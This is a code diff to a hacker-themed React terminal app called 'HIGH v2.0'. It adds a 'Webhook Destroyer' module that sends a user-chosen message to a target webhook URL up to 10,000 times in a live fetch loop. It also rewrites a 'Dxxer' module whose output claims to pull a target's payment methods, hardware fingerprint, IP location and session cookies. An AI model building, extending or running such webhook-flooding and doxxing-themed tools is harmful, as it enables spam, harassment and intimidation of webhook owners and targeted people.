@@ -38,7 +38,7 @@ const LEAF = String.raw`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀�
 
 type Line = { text: string; color?: string };
 type Provider = "discord" | "netlify";
-type Tool = "dxxer" | "rare";
+type Tool = "dxxer" | "rare" | "destroyer";
 type Stage =
   | "banner"
   | "menu"
@@ -49,7 +49,12 @@ type Stage =
   | "searching"
   | "sending"
   | "askRareLen"
-  | "rareScanning";
+  | "rareScanning"
+  | "destroyAskUrl"
+  | "destroyAskMsg"
+  | "destroyAskCount"
+  | "destroyAskDelay"
+  | "destroying";
 
 const FIRST = ["Johnathan","Marcus","Tyler","Aiden","Liam","Ethan","Mason","Lucas","Caleb","Nathan","Dylan","Jaxon","Owen","Wyatt","Sebastian","Hunter"];
 const MIDDLE = ["A.","B.","C.","D.","E.","F.","G.","H.","J.","K.","L.","M.","R.","S.","T."];
@@ -140,6 +145,10 @@ export function FullscreenTerminal() {
   const [bannerDone, setBannerDone] = useState(false);
   const [bannerLinesShown, setBannerLinesShown] = useState<string[]>([]);
   const [tool, setTool] = useState<Tool | null>(null);
+  const [mounted, setMounted] = useState(false);
+  const [destroyUrl, setDestroyUrl] = useState("");
+  const [destroyMsg, setDestroyMsg] = useState("");
+  const [destroyCount, setDestroyCount] = useState(0);
   const inputRef = useRef<HTMLInputElement>(null);
   const scrollRef = useRef<HTMLDivElement>(null);
 
@@ -147,6 +156,7 @@ export function FullscreenTerminal() {
   const appendMany = useCallback((arr: Line[]) => setLines((l) => [...l, ...arr]), []);
 
   useEffect(() => {
+    setMounted(true);
     let cancelled = false;
     const bl = BANNER.split("\n");
     let i = 0;
@@ -172,12 +182,13 @@ export function FullscreenTerminal() {
   const showMenu = useCallback(() => {
     appendMany([
       { text: "Welcome to HIGH v2.0", color: "oklch(0.82 0.20 145)" },
-      { text: "Loaded modules: 2 — type a number to launch.", color: "oklch(0.65 0.04 260)" },
+      { text: "Loaded modules: 3 — type a number to launch.", color: "oklch(0.65 0.04 260)" },
       { text: "" },
-      { text: "  [1] Dxxer          — webhook transmitter (Discord / Netlify)", color: "oklch(0.85 0.10 145)" },
-      { text: "  [2] Rare Username  — finder for short / available handles", color: "oklch(0.85 0.10 145)" },
+      { text: "  [1] Dxxer", color: "oklch(0.85 0.10 145)" },
+      { text: "  [2] Rare Username", color: "oklch(0.85 0.10 145)" },
+      { text: "  [3] Webhook Destroyer", color: "oklch(0.85 0.10 145)" },
       { text: "" },
-      { text: "Select a tool (1/2):" },
+      { text: "Select a tool (1/2/3):" },
     ]);
     setStage("menu");
   }, [appendMany]);
@@ -257,7 +268,11 @@ export function FullscreenTerminal() {
       stage === "askWebhook" ||
       stage === "confirm" ||
       stage === "askVictim" ||
-      stage === "askRareLen"
+      stage === "askRareLen" ||
+      stage === "destroyAskUrl" ||
+      stage === "destroyAskMsg" ||
+      stage === "destroyAskCount" ||
+      stage === "destroyAskDelay"
     )
       inputRef.current?.focus();
   }, [stage]);
@@ -346,20 +361,23 @@ export function FullscreenTerminal() {
     }
     setStage("searching");
     const phases = [
-      `Locking onto target ${id}`,
-      "Resolving username & avatar",
-      "Querying gateway sessions",
-      "Scraping connected accounts",
-      "Pulling billing & payment methods",
-      "Reading hardware fingerprint (HWID)",
-      "Geolocating last known IP",
-      "Decrypting session cookies",
-      "Compiling profile dossier",
+      `[*] Locking onto target ${id}...`,
+      "[*] Using ONIST to resolve identity...",
+      "[*] Using ONIST to query session data...",
+      "[*] Using OSINT-X to scrape connected accounts...",
+      "[*] Using BillScope to pull payment methods...",
+      "[*] Using HWID-Trace to read hardware fingerprint...",
+      "[*] Using GeoIP-Hunter to locate IP...",
+      "[*] Using CookieRipper to decrypt session cookies...",
+      "[*] Compiling dossier...",
     ];
     for (const p of phases) {
-      await spinTask(p, 350 + Math.random() * 300);
+      await typewrite(p, "oklch(0.78 0.16 200)", 10);
+      await sleep(220 + Math.random() * 260);
+      await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
     }
-    await typewrite("[✓] Done.", "oklch(0.85 0.18 140)", 12);
+    append({ text: "" });
+    await typewrite("[✓] DONE", "oklch(0.85 0.18 140)", 14);
     await sleep(280);
 
     setStage("sending");
@@ -498,8 +516,9 @@ export function FullscreenTerminal() {
       setTool("dxxer");
       append({ text: "" });
       await typewrite("» Launching Dxxer...", "oklch(0.78 0.16 200)", 14);
-      await spinTask("Initialized secure transfer protocol", 500);
-      append({ text: "Supported endpoints: Discord webhooks, Netlify build hooks.", color: "oklch(0.65 0.04 260)" });
+      await typewrite("[*] Initializing secure transfer protocol...", "oklch(0.78 0.16 200)", 10);
+      await sleep(300);
+      await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
       append({ text: "" });
       append({ text: "Please enter your webhook URL (Discord or Netlify):" });
       setStage("askWebhook");
@@ -511,9 +530,105 @@ export function FullscreenTerminal() {
       append({ text: "" });
       append({ text: "Username length (3–20):" });
       setStage("askRareLen");
+    } else if (v === "3" || v.toLowerCase().startsWith("destroy") || v.toLowerCase().startsWith("webhook destroy")) {
+      setTool("destroyer");
+      append({ text: "" });
+      await typewrite("» Launching Webhook Destroyer...", "oklch(0.78 0.16 200)", 14);
+      await typewrite("[*] Arming spam cannon...", "oklch(0.78 0.16 200)", 10);
+      await sleep(300);
+      await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+      append({ text: "" });
+      append({ text: "Enter target webhook URL:" });
+      setStage("destroyAskUrl");
     } else {
-      append({ text: "Unknown selection. Type 1 or 2.", color: "var(--terminal-red)" });
+      append({ text: "Unknown selection. Type 1, 2, or 3.", color: "var(--terminal-red)" });
     }
+  };
+
+  // ---- Webhook Destroyer ----
+  const submitDestroyUrl = async (val: string) => {
+    const url = val.trim();
+    append({ text: `> ${url.replace(/(\/[^/]+)$/, "/****")}` });
+    if (!/^https?:\/\/.+/.test(url)) {
+      append({ text: "Invalid URL. Must start with http(s)://", color: "var(--terminal-red)" });
+      append({ text: "Enter target webhook URL:" });
+      return;
+    }
+    setDestroyUrl(url);
+    append({ text: "Enter message to send:" });
+    setStage("destroyAskMsg");
+  };
+
+  const submitDestroyMsg = async (val: string) => {
+    append({ text: `> ${val}` });
+    if (!val.trim()) {
+      append({ text: "Message cannot be empty.", color: "var(--terminal-red)" });
+      append({ text: "Enter message to send:" });
+      return;
+    }
+    setDestroyMsg(val);
+    append({ text: "How many times should it be sent? (1–10000)" });
+    setStage("destroyAskCount");
+  };
+
+  const submitDestroyCount = async (val: string) => {
+    append({ text: `> ${val}` });
+    const n = parseInt(val.trim(), 10);
+    if (!Number.isFinite(n) || n < 1 || n > 10000) {
+      append({ text: "Invalid count. Enter a number between 1 and 10000.", color: "var(--terminal-red)" });
+      append({ text: "How many times should it be sent? (1–10000)" });
+      return;
+    }
+    setDestroyCount(n);
+    append({ text: "Delay between sends in seconds (0.5–5):" });
+    setStage("destroyAskDelay");
+  };
+
+  const submitDestroyDelay = async (val: string) => {
+    append({ text: `> ${val}` });
+    const d = parseFloat(val.trim());
+    if (!Number.isFinite(d) || d < 0.5 || d > 5) {
+      append({ text: "Invalid delay. Enter a number between 0.5 and 5.", color: "var(--terminal-red)" });
+      append({ text: "Delay between sends in seconds (0.5–5):" });
+      return;
+    }
+    setStage("destroying");
+    append({ text: "" });
+    await typewrite(`[*] Locking onto webhook...`, "oklch(0.78 0.16 200)", 10);
+    await sleep(280);
+    await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+    await typewrite(`[*] Preparing payload x${destroyCount}...`, "oklch(0.78 0.16 200)", 10);
+    await sleep(280);
+    await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+    append({ text: "" });
+    append({ text: `[*] Firing ${destroyCount} message(s) @ ${d}s delay`, color: "oklch(0.78 0.16 200)" });
+    let success = 0;
+    let fail = 0;
+    for (let i = 1; i <= destroyCount; i++) {
+      try {
+        const res = await fetch(destroyUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: destroyMsg }),
+        });
+        if (res.ok || res.status === 204) {
+          success++;
+          append({ text: `  [${i}/${destroyCount}] ✓ delivered`, color: "oklch(0.85 0.18 140)" });
+        } else {
+          fail++;
+          append({ text: `  [${i}/${destroyCount}] ✗ HTTP ${res.status}`, color: "var(--terminal-red)" });
+        }
+      } catch (e) {
+        fail++;
+        append({ text: `  [${i}/${destroyCount}] ✗ ${(e as Error).message}`, color: "var(--terminal-red)" });
+      }
+      if (i < destroyCount) await sleep(d * 1000);
+    }
+    append({ text: "" });
+    await typewrite(`[✓] DONE — ${success} delivered, ${fail} failed`, "oklch(0.85 0.18 140)", 12);
+    append({ text: "" });
+    append({ text: "Enter target webhook URL (or type 'menu'):" });
+    setStage("destroyAskUrl");
   };
 
   const onSubmit = (e: React.FormEvent) => {
@@ -522,7 +637,16 @@ export function FullscreenTerminal() {
     const val = input;
     setInput("");
     // global "menu" command
-    if (val.trim().toLowerCase() === "menu" && (stage === "askVictim" || stage === "askRareLen" || stage === "askWebhook")) {
+    if (
+      val.trim().toLowerCase() === "menu" &&
+      (stage === "askVictim" ||
+        stage === "askRareLen" ||
+        stage === "askWebhook" ||
+        stage === "destroyAskUrl" ||
+        stage === "destroyAskMsg" ||
+        stage === "destroyAskCount" ||
+        stage === "destroyAskDelay")
+    ) {
       append({ text: `> menu` });
       append({ text: "" });
       showMenu();
@@ -533,6 +657,10 @@ export function FullscreenTerminal() {
     else if (stage === "confirm") submitConfirm(val);
     else if (stage === "askVictim") submitVictim(val);
     else if (stage === "askRareLen") submitRareLen(val);
+    else if (stage === "destroyAskUrl") submitDestroyUrl(val);
+    else if (stage === "destroyAskMsg") submitDestroyMsg(val);
+    else if (stage === "destroyAskCount") submitDestroyCount(val);
+    else if (stage === "destroyAskDelay") submitDestroyDelay(val);
   };
 
   const prompt =
@@ -540,14 +668,27 @@ export function FullscreenTerminal() {
     stage === "askWebhook" ? "webhook>" :
     stage === "confirm" ? "(y/n)>" :
     stage === "askVictim" ? "target>" :
-    stage === "askRareLen" ? "len>" : "$";
+    stage === "askRareLen" ? "len>" :
+    stage === "destroyAskUrl" ? "url>" :
+    stage === "destroyAskMsg" ? "msg>" :
+    stage === "destroyAskCount" ? "count>" :
+    stage === "destroyAskDelay" ? "delay>" : "$";
   const showInput =
     stage === "menu" ||
     stage === "askWebhook" ||
     stage === "confirm" ||
     stage === "askVictim" ||
-    stage === "askRareLen";
-  const busy = stage === "validating" || stage === "searching" || stage === "sending" || stage === "rareScanning";
+    stage === "askRareLen" ||
+    stage === "destroyAskUrl" ||
+    stage === "destroyAskMsg" ||
+    stage === "destroyAskCount" ||
+    stage === "destroyAskDelay";
+  const busy =
+    stage === "validating" ||
+    stage === "searching" ||
+    stage === "sending" ||
+    stage === "rareScanning" ||
+    stage === "destroying";
 
   return (
     <div
@@ -598,7 +739,7 @@ export function FullscreenTerminal() {
         className="relative z-10 flex flex-wrap items-center justify-center gap-4 border-b px-3 pb-3 pt-4 md:gap-8"
         style={{ borderColor: "oklch(1 0 0 / 0.06)" }}
       >
-        <pre
+        {mounted && <pre
           aria-hidden
           className="m-0 hidden font-mono leading-[1] md:block"
           style={{
@@ -610,7 +751,7 @@ export function FullscreenTerminal() {
           }}
         >
 {LEAF}
-        </pre>
+        </pre>}
         <pre
           className="m-0 text-center font-mono text-[10px] leading-[1.05] sm:text-[11px] md:text-[14px]"
           style={{
@@ -619,9 +760,9 @@ export function FullscreenTerminal() {
             whiteSpace: "pre",
           }}
         >
-{bannerLinesShown.join("\n")}{!bannerDone && <span className="terminal-cursor">█</span>}
+{mounted ? bannerLinesShown.join("\n") : ""}{mounted && !bannerDone && <span className="terminal-cursor">█</span>}
         </pre>
-        <pre
+        {mounted && <pre
           aria-hidden
           className="m-0 hidden font-mono leading-[1] md:block"
           style={{
@@ -634,7 +775,7 @@ export function FullscreenTerminal() {
           }}
         >
 {LEAF}
-        </pre>
+        </pre>}
       </div>
       {bannerDone && (
         <div
